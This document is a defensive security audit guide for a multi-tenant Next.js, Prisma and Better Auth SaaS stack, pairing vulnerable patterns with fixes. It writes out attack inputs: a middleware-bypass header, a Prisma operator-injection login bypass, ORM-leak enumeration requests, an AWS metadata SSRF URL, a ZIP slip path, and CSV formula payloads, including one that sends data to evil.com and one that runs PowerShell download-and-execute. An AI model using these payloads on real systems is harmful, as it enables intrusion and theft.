# Multi-tenant SaaS security audit: Next.js 16, Prisma, Better Auth

**This stack carries at least three critical-severity vulnerabilities discovered in the past year**, including a CVSS 10.0 unauthenticated remote code execution in React Server Components and a CVSS 9.1 complete middleware authorization bypass in Next.js. The combination of server actions as public HTTP endpoints, Prisma's susceptibility to operator injection, Better Auth's known authentication bypass, and multi-tenant data isolation complexity creates a uniquely dense attack surface. Every layer — from the service worker cache to the PostgreSQL query layer — demands independent security enforcement, because any single layer can be bypassed.

---

## 1. Critical CVEs you must patch immediately

Before any code-level audit, verify your dependency versions against these actively exploited vulnerabilities:

| CVE | CVSS | Component | Attack | Patched In |
|-----|------|-----------|--------|------------|
| CVE-2025-55182 / CVE-2025-66478 | **10.0** | React RSC / Next.js | **Unauthenticated RCE** via RSC Flight protocol deserialization. Single HTTP request grants shell access. Exploited in the wild by Chinese APT groups within hours of disclosure. | React 19.0.1/19.1.2/19.2.1; Next.js 15.0.5+/16.x patched |
| CVE-2025-29927 | **9.1** | Next.js Middleware | Adding `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` header **completely skips all middleware**, bypassing authentication, CSP, and redirects. Trivially exploitable. | Next.js 14.2.25/15.2.3+ |
| CVE-2025-61928 | **9.3** | Better Auth | **Unauthenticated API key creation** for arbitrary users via `/api/auth/api-key/create`. Bypasses MFA entirely. | Better Auth v1.3.26 |
| CVE-2025-27143 | High | Better Auth | `trustedOrigins` bypass enables open redirect → **one-click account takeover** via password reset token leakage. | Better Auth v1.1.21 |
| CVE-2024-51479 | 7.5 | Next.js Middleware | Pathname-based authorization bypass for root-level routes. | Next.js 14.2.15+ |
| CVE-2025-55183 | 5.3 | React RSC | Crafted request returns **compiled source code** of other server functions. | Dec 11, 2025 advisory |
| CVE-2025-55184 / CVE-2025-67779 / CVE-2026-23864 | 7.5 | React RSC | DoS via infinite loop from crafted HTTP requests. | Latest patched versions (Jan 2026) |
| CVE-2025-62506 | 8.1 | MinIO | Service accounts bypass inline IAM policy restrictions → **privilege escalation** to full parent access. | RELEASE.2025-10-15+ |

**After patching React2Shell, rotate all application secrets.** The vulnerability grants full server access, meaning any secrets on the server must be considered compromised if you were running an unpatched version.

---

## 2. Next.js server actions are public HTTP endpoints

Every function marked with `'use server'` creates a publicly callable POST endpoint. This is the single most important architectural fact for this audit. Server actions bypass middleware, TypeScript type guards, and component-level protections.

**The "forgotten auth check" anti-pattern** is the most common vulnerability. Authentication is checked on the page rendering the form, but the server action itself has no verification:

```typescript
// ❌ VULNERABLE — anyone can call this with curl
'use server';
export async function deleteUser(userId: string) {
  await prisma.user.delete({ where: { id: userId } });
}

// ✅ SECURE — auth + validation + authorization inside the action
'use server';
import { z } from 'zod';
const schema = z.object({ userId: z.string().uuid() });

export async function deleteUser(input: unknown) {
  const session = await auth();
  if (!session?.user) throw new Error('Unauthorized');
  const { userId } = schema.parse(input);
  const { orgId, role } = await getAuthenticatedContext();
  if (role !== 'admin') throw new Error('Forbidden');
  await prisma.user.delete({ where: { id: userId, organizationId: orgId } });
}
```

**Closure variable capture** is another server-action-specific risk. When server actions are defined inline within server components, they capture scope variables that get encrypted and round-tripped through the client. Values passed via `.bind()` are intentionally **not encrypted**. Move all server actions to separate `'use server'` files to avoid leaking secrets through closures.

**CSRF protection gaps**: Server actions verify Origin against Host, but route handlers (`route.ts`) get **no automatic CSRF protection**. Custom `allowedOrigins` must be configured for apps behind reverse proxies. Missing this configuration either breaks legitimate requests or allows CSRF bypasses.

**Defense-in-depth is mandatory**: CVE-2025-29927 and CVE-2024-51479 proved that middleware can be completely bypassed. Every server action and route handler must independently verify authentication and authorization. Strip the `x-middleware-subrequest` header at your WAF/reverse proxy as an additional safeguard.

---

## 3. Multi-tenant isolation demands verification at every query

Tenant data isolation failures are the #1 SaaS security risk. A single missing `organizationId` filter exposes all tenants' data simultaneously.

**The cardinal rule**: never accept `organizationId` from client input. Always derive it from the authenticated session:

```typescript
// ❌ VULNERABLE — trusts client-supplied orgId
const { organizationId, resourceId } = await req.json();
return prisma.resource.findFirst({ where: { id: resourceId, organizationId } });

// ✅ SECURE — orgId from verified session only
const { orgId } = await getAuthenticatedContext();
return prisma.resource.findFirst({ where: { id: resourceId, organizationId: orgId } });
```

**Every Prisma query on tenant-scoped data** — `findUnique`, `findFirst`, `findMany`, `update`, `delete` — must include the `organizationId` in its `where` clause. Consider Prisma Client Extensions to auto-inject tenant scoping, but know their limits: raw queries, relation filters, and aggregate queries may bypass the extension. PostgreSQL Row-Level Security provides a stronger defense-in-depth layer:

```sql
ALTER TABLE projects ENABLE ROW LEVEL SECURITY;
ALTER TABLE projects FORCE ROW LEVEL SECURITY;
CREATE POLICY tenant_isolation ON projects
  USING (organization_id = current_setting('app.current_tenant_id')::uuid);
```

**Cross-tenant leakage vectors beyond the database**:
- **React Query cache**: Queries keyed as `['invoices', { page: 1 }]` without `orgId` will serve cached data from the previous tenant after an org switch. Always include `orgId` in every query key and call `queryClient.clear()` on organization switch.
- **Service worker cache**: URL-only cache keys serve Tenant A's `/api/dashboard` response to Tenant B. Never cache tenant-specific API responses in service workers.
- **Redis/in-memory cache**: Keys must be namespaced as `cache:${orgId}:resource:${id}`.
- **Background jobs/webhooks**: Queue processors lose request context. Embed `organizationId` in every job payload and re-verify it in the processor.
- **File storage paths**: Every S3 key must be prefixed with `/${orgId}/`. Validate that resolved paths don't escape the tenant prefix.
- **Error messages**: Stack traces can contain data from other tenants. Return generic errors to clients.

**Race conditions during organization switching**: Better Auth stores `activeOrganizationId` on the session. Concurrent requests during a switch may execute with stale org context. Verify membership on every request rather than trusting `activeOrganizationId` alone — known Better Auth issues (#4708, #3233) confirm edge cases where `activeOrganizationId` can be lost or improperly set.

---

## 4. Prisma ORM injection goes far beyond raw queries

Prisma is not immune to injection. Three distinct attack classes affect it.

**Operator injection** is the most underappreciated Prisma vulnerability. When unsanitized request bodies flow into `where` clauses, attackers pass operator objects instead of primitive values:

```typescript
// Attack payload: { "email": "admin@example.com", "password": { "not": "" } }
// This matches ANY non-empty password, bypassing authentication
const user = await prisma.user.findFirst({
  where: { email, password }  // password = { "not": "" } bypasses auth!
});
```

Functions accepting operators include `findFirst`, `findMany`, `updateMany`, and `deleteMany`. Fix this by validating all inputs with Zod and casting to primitive types before passing to Prisma.

**ORM Leak / Relation traversal attacks** (discovered by elttam, 2024) allow character-by-character data exfiltration through relational filters when user input controls `where` clauses:

```
GET /articles?filter[createdBy][resetToken][startsWith]=a
GET /articles?filter[createdBy][resetToken][startsWith]=ab
// Enumerate sensitive fields across relations by observing response differences
```

The `plormber` tool automates this attack, including time-based variants. **Never pass user input directly to `where`, `include`, or `select`**. Use strict allowlists of filterable fields.

**Mass assignment** occurs when request bodies are passed directly to `prisma.model.create()` or `update()`. An attacker can set `isAdmin: true` or `role: "SUPERADMIN"`. Always validate and whitelist fields with Zod schemas before database operations.

**Raw query injection**: `$queryRawUnsafe` with string interpolation is explicitly dangerous. The `$queryRaw` tagged template is safe — but `Prisma.raw()` within tagged templates and fake template objects both bypass parameterization. Audit every usage of `$queryRaw`, `$queryRawUnsafe`, `$executeRaw`, and `$executeRawUnsafe`.

---

## 5. Better Auth attack surface includes authentication bypass and 2FA weaknesses

**CVE-2025-61928** (CVSS 9.3) allowed **unauthenticated API key creation** for arbitrary users. The vulnerability was in fallback logic that trusted `userId` from the request body when no session existed. Search your codebase for any similar pattern where auth checks fall back to client-supplied identity.

**2FA bypass vectors specific to Better Auth**:
- **Pre-2FA session exploitation**: After password auth but before TOTP verification, a session cookie is issued. If protected endpoints don't check `session.twoFactorVerified === true`, the pre-2FA session grants full access.
- **TOTP brute force**: With a 30-second window and ±1 tolerance, ~3 million codes are valid per 90-second window. Enforce max 5 attempts per session, then lock.
- **Session persistence on 2FA enable**: When a user enables 2FA, existing sessions from before 2FA should be invalidated. Force re-authentication.
- **Backup code weaknesses**: Verify codes are single-use, hashed in the database, and rate-limited.

**Session security considerations**: Better Auth's cookie cache has three strategies. The JWT strategy signs but does **not encrypt** session data — use JWE strategy if session data contains sensitive information. Session tokens don't change on org switch, so stale permission state can persist. Use `freshSessionMiddleware` for high-value operations and `sensitiveSessionMiddleware` for password changes and account deletion.

**Organization plugin bugs**: GitHub issues #3233 and #5909 document `activeOrganizationId` being lost when combined with `customSession` plugin due to plugin ordering. If `activeOrganizationId` is undefined, your app must fail closed (throw error), not fail open (serve unscoped data).

---

## 6. RBAC bypass: client-side gates provide zero security

React components conditionally rendering admin interfaces based on role (`{isAdmin && <AdminPanel />}`) provide UX convenience only. The corresponding server action is a public endpoint callable by anyone. **Every server action must independently verify permissions.**

**Privilege escalation patterns to audit**:
- Self-elevation via profile update endpoints that accept `role` from client input
- Invitation endpoints that don't validate the inviter can assign the specified role
- Custom role creation (when `dynamicAccessControl` is enabled) that grants permissions exceeding the creator's own
- Last-owner protection: prevent demotion of the only organization owner

**TOCTOU in permission checks**: Permission is verified, then a slow operation executes, and by the time the database write happens, the user's role has changed. For critical operations, re-verify permissions inside a database transaction:

```typescript
await prisma.$transaction(async (tx) => {
  const membership = await tx.member.findUnique({
    where: { userId_organizationId: { userId, organizationId: orgId } }
  });
  if (membership?.role !== 'owner') throw new Error('Forbidden');
  await tx.project.delete({ where: { id: projectId, organizationId: orgId } });
});
```

---

## 7. File storage, uploads, and presigned URLs

**SSRF through file proxy**: If your app proxies S3/MinIO files, attackers can target internal services (`http://169.254.169.254/latest/meta-data/` for AWS credential theft). Validate that all proxied URLs point exclusively to your storage bucket's hostname.

**Path traversal in storage keys**: A filename of `../../other-org-id/secret.pdf` escapes the tenant prefix. Use `path.basename()`, strip path separators, whitelist allowed characters, and verify the resolved key starts with the tenant prefix.

**File upload attack checklist**:
- **Polyglot files**: Validate magic bytes AND extension AND content-type independently. Serve user uploads from a separate domain with `Content-Disposition: attachment`.
- **SVG with embedded JavaScript**: Either reject SVG uploads entirely or sanitize with DOMPurify server-side.
- **Content-type spoofing**: Use the `file-type` npm package to detect actual MIME type from file signatures, not the `Content-Type` header.
- **Zip bombs**: Check compression ratio (reject >100:1) and enforce maximum total extraction size before processing.

**Presigned URL risks**: URLs are bearer tokens usable by anyone for their entire validity period, with unlimited uses. Keep expiry to minutes (not hours), scope to minimum permissions, and always verify tenant ownership before generating URLs. **MinIO CVE-2025-62506** allows service accounts to bypass IAM policy restrictions — upgrade MinIO to RELEASE.2025-10-15+.

---

## 8. PDF generation exposes SSRF through resource loading

While `@react-pdf/renderer` has no known CVEs, it fetches resources server-side. Both `Font.register({ src: url })` and `<Image src={url} />` make server-side HTTP requests. If user input influences these URLs, attackers can target internal services (blind SSRF) or AWS metadata endpoints.

**Mitigations**: Hardcode all font sources as local file paths. For dynamic images, pre-fetch and validate URLs against a strict domain allowlist before passing to the renderer. Set memory limits and timeouts on PDF generation workers, and limit maximum rows/pages to prevent resource exhaustion from large datasets. Strip PDF metadata fields (`title`, `author`, `subject`) that could leak internal information.

---

## 9. CSV injection enables client-side code execution

CSV injection (formula injection, CWE-1236) remains actively exploited in 2025, with CVE-2025-61873 and CVE-2025-12249 both involving formula injection escalating to RCE. When exported CSV cells begin with `=`, `+`, `-`, `@`, `\t`, or `\r`, spreadsheet programs interpret them as formulas.

**Critical payloads to defend against**:
```
=CMD|'/C powershell IEX(webclient download)'!A0    // RCE
=HYPERLINK("http://evil.com?data="&A1, "Click")    // Data exfiltration
=DDE("cmd";"/C calc";"!A0")                        // DDE attack
```

**Sanitize every cell in exported CSVs** by prefixing dangerous characters with a tab character (`\t`) inside quoted fields. Also check for full-width Unicode variants (`＝`, `＋`, `－`, `＠`) used to bypass ASCII-only sanitization.

**CSV import risks**: Stream-parse with row limits (reject files over a threshold) and file size caps. Validate field lengths and types. Scope exports with tenant filters and RBAC checks — users should only export data they're authorized to see. Audit-log every export with record counts.

---

## 10. Archive import/export: ZIP slip and decompression bombs

ZIP Slip path traversal continues to produce CVEs in 2025 (CVE-2025-3445, CVE-2025-32779, CVE-2025-66945). The attack embeds entries with names like `../../../../app/node_modules/express/lib/router/index.js` to overwrite application code during extraction. A newer variant uses symlinks: the archive contains a symlink pointing to `/etc/`, then a file `link/passwd` that writes through the symlink.

**Validate every entry path** by resolving it and confirming it stays within the output directory. Check for symlinks. Enforce compression ratio limits (reject >100:1) and total extraction size caps. For JSON import, validate nesting depth (max ~20 levels) and total size. **Always generate new IDs during import** — maintain an `oldId → newId` mapping and rewrite all references. Force the tenant ID to the importing organization's ID on every imported record, and validate that all foreign key references resolve within the same tenant.

---

## 11. PWA cache is a cross-tenant data leakage vector

**React Query cross-tenant cache leakage** is the highest-risk PWA vulnerability for this stack. If query keys don't include `orgId`, cached data from Tenant A is served to Tenant B after an organization switch:

```typescript
// ❌ VULNERABLE — serves cached data from previous org
useQuery({ queryKey: ['invoices', { page }], ... });

// ✅ SECURE — tenant-scoped cache key
useQuery({ queryKey: ['invoices', orgId, { page }], ... });
```

On every organization switch, call `queryClient.clear()` and remove any persisted cache from localStorage. If using `PersistQueryClientProvider`, the **entire query cache is serialized to localStorage unencrypted** — avoid persisting sensitive tenant data.

**Service worker cache poisoning**: A `CacheFirst` strategy keyed only by URL serves stale or cross-tenant responses. Cache only truly static assets (JS bundles, CSS, images). Use `NetworkFirst` for any tenant-specific data. Set `Cache-Control: no-cache, no-store` on the service worker file itself and use `updateViaCache: 'none'` in registration.

**Offline data exposure**: Cached API responses, IndexedDB entries, and localStorage data persist on disk unencrypted. On shared devices, the next user can inspect this via DevTools. Clear all client-side storage on logout. Background sync queues (`SyncManager`) may replay pending mutations under a different user's session if the original user logged out before sync completed.

---

## 12. Barcode and QR code scanning as injection vectors

QR codes encode arbitrary text, meaning every scanned value is untrusted input. If scanned values flow into Prisma raw queries, React's `dangerouslySetInnerHTML`, or `href` attributes, injection is immediate.

**Validate scanned values** with strict regex patterns (e.g., `^[A-Za-z0-9-]{1,128}$` for product barcodes). For URL-containing QR codes, parse with the `URL` constructor, verify `.hostname` against an allowlist (not string matching, which fails for `yoursaas.com.evil.com` or `yoursaas.com@evil.com`), and block `javascript:` and `data:` protocols. Never auto-navigate to scanned URLs — show a confirmation dialog with the destination hostname.

**QRLJacking**: If your app uses QR codes for login, attackers can display their session's QR code to victims. The victim scans it, authenticating the attacker's session. Mitigate with short expiry (30 seconds), per-session QR regeneration, and explicit device confirmation.

---

## 13. Financial calculations require atomic database operations

**Floating-point arithmetic corrupts financial data.** JavaScript's `0.1 + 0.2 !== 0.3` means every monetary calculation using `Number` introduces rounding errors. Use Prisma's `Decimal` type backed by `@db.Decimal(10, 2)` and compute with `Prisma.Decimal` or `Decimal.js` exclusively. Add database-level `CHECK` constraints enforcing `total >= 0`, `price >= 0`, `quantity > 0`, and `0 <= discount <= 100`.

**Price tampering**: Never accept prices, totals, or discount amounts from client input. Always look up the canonical price server-side from the database record. **Discount manipulation** includes applying codes multiple times (race condition), negative values creating credits, and percentages exceeding 100%. Use a unique constraint on `(orderId, discountCode)` with atomic transaction-based application.

**Race conditions in balance/wallet operations** are the classic TOCTOU bug. The check-then-act pattern (`if (balance >= amount) { update balance }`) fails under concurrency. Use atomic conditional updates:

```typescript
const result = await prisma.$executeRaw`
  UPDATE "Wallet" SET balance = balance - ${amount}
  WHERE "userId" = ${userId} AND balance >= ${amount}
`;
if (result === 0) throw new Error('Insufficient balance');
```

Use **idempotency keys** (client-generated UUIDs with unique constraint) to prevent double-charges from network retries.

---

## 14. Booking and inventory race conditions need database-level enforcement

The check-then-insert pattern for bookings is fundamentally broken under concurrency. Two requests simultaneously check availability, both see an open slot, and both create bookings — producing a double-booking.

**The strongest fix is a database exclusion constraint** using PostgreSQL's `btree_gist` extension for time-range bookings, or a conditional unique index for fixed-slot bookings. This guarantees atomicity regardless of application-level bugs:

```sql
CREATE EXTENSION IF NOT EXISTS btree_gist;
ALTER TABLE "Booking" ADD CONSTRAINT no_overlapping_bookings
  EXCLUDE USING gist (
    "resourceId" WITH =,
    tstzrange("startTime", "endTime") WITH &&
  ) WHERE (status != 'CANCELLED');
```

For inventory, add `CHECK (stock >= 0)` and use atomic decrements (`UPDATE ... SET stock = stock - $quantity WHERE stock >= $quantity`). `SELECT FOR UPDATE` within Prisma interactive transactions works for row-level locking but **only locks existing rows** — it cannot prevent phantom inserts. Use `FOR UPDATE SKIP LOCKED` for queue-style processing under high contention.

**Critical Prisma caveat**: Session-level advisory locks (`pg_advisory_lock`) may execute `lock` and `unlock` on different pooled connections, causing deadlocks. Always use transaction-level advisory locks (`pg_advisory_xact_lock`) which auto-release on commit/rollback. Set `maxWait` and `timeout` on all interactive transactions.

---

## 15. OWASP Top 10:2025 mapped to this stack

The 2025 edition introduced two new categories and reorganized priorities. Here is how each maps to this specific technology combination:

**A01 — Broken Access Control** (still #1): Multi-tenant SaaS is the highest-risk architecture for this category. SSRF is now consolidated here. Every Prisma query needs `orgId` scoping, every server action needs auth, and S3 presigned URLs need tenant validation.

**A02 — Security Misconfiguration** (moved up from #5): Next.js source maps in production (`productionBrowserSourceMaps: true`), exposed `.env` files, `poweredBy: true` leaking framework version, S3 buckets with public policies (31% of buckets per Qualys research), wildcard CORS, and missing security headers.

**A03 — Software Supply Chain Failures** (new, replaced "Vulnerable Components"): React2Shell (CVE-2025-55182) is the most severe JS ecosystem vulnerability in recent memory — unauthenticated RCE via a single HTTP request. Run `npm audit` in CI/CD, commit lockfiles, verify package provenance, and pin exact versions for security-critical packages.

**A04 — Cryptographic Failures**: Session cookies must have `Secure`, `HttpOnly`, `SameSite=Lax`. Better Auth's JWT cookie cache strategy exposes session data (use JWE instead). React Query's persisted cache in localStorage is completely unencrypted. Enable SSE-KMS for S3 tenant data.

**A05 — Injection**: Prisma operator injection, raw query injection, XSS through `dangerouslySetInnerHTML` (especially barcode values), CSV formula injection, and command injection through PDF generation tools.

**A06 — Insecure Design**: Missing tenant isolation at the architectural level — no RLS safety net, cache keys without tenant prefix, background jobs without tenant context, file paths without tenant prefix.

**A07 — Authentication Failures**: CVE-2025-29927 (middleware bypass), CVE-2025-61928 (Better Auth authentication bypass), session fixation, and multi-tenant session confusion during org switching.

**A08 — Software or Data Integrity**: CI/CD pipeline injection via PR titles/branch names, import/export deserialization attacks, service worker integrity (no SRI), and auto-updates without lockfile verification.

**A09 — Security Logging and Alerting**: Next.js server components have no built-in request logging. Log all auth events with `orgId`, authorization failures, org switches, and data exports. Client-side errors in service workers need explicit reporting.

**A10 — Mishandling of Exceptional Conditions** (new): Prisma errors exposed to clients leak table names and schema. Fail-open patterns where unreachable auth services default to allowing access. Malformed barcodes crashing React component trees without Error Boundaries. Failed React Query queries displaying stale cross-tenant data.

---

## Consolidated audit checklist

**Patch immediately** — verify Next.js, React, Better Auth, and MinIO are on patched versions for all listed CVEs. Rotate all secrets after patching React2Shell.

**Verify on every server action and route handler**: (1) Authentication via `getAuthenticatedContext()`, not middleware alone. (2) Input validation with Zod as the first operation. (3) Authorization check against the user's role and membership. (4) Tenant scoping with server-derived `orgId` in every Prisma query.

**Database hardening**: Add `CHECK` constraints for financial fields, exclusion constraints for bookings, unique constraints for idempotency. Enable RLS as defense-in-depth. Connect as a non-superuser that cannot `BYPASSRLS`. Use `SET LOCAL` within transactions for RLS session variables.

**Client-side isolation**: Include `orgId` in every React Query key. Clear all caches on org switch and logout. Never persist sensitive data to localStorage. Cache only static assets in service workers. Set strict CSP with `worker-src 'self'`.

**File handling**: Validate magic bytes independently of Content-Type headers. Serve uploads from a separate domain. Sanitize CSV exports against formula injection. Validate ZIP entry paths against traversal. Generate new IDs on import with reference remapping.

**Rate limiting**: Next.js provides none by default. Implement per-IP rate limiting on unauthenticated endpoints, per-user on authenticated endpoints, and per-tenant to prevent noisy-neighbor DoS. Prioritize auth endpoints, 2FA verification, and data export routes.